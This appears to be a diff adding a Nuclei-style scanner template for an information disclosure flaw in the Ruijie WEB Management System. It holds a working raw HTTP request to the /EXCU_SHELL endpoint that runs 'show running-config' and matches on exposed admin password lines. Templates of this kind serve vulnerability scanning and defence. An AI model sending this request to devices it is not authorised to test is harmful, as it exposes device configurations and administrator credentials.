@@ -1,0 +1,28 @@
+id: ruijie-web-management-info-disclosure
+info:
+  name: Ruijie WEB Management System EXCU_SHELL Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Ruijie WEB Management System suffers from an information disclosure vulnerability in the EXCU_SHELL endpoint, allowing attackers to retrieve sensitive system information.
+  reference:
+    - https://www.ruijie.com.cn/
+  tags: information-disclosure
+http:
+  - raw:
+      - |
+        GET /EXCU_SHELL HTTP/1.1
+        Host: {{Hostname}}
+        cmdnum: 1
+        confirm1: n
+        command1: show%20running-config
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "no service password-encrypt"
+          - "user admin password"
+      - type: status
+        status:
+          - 200
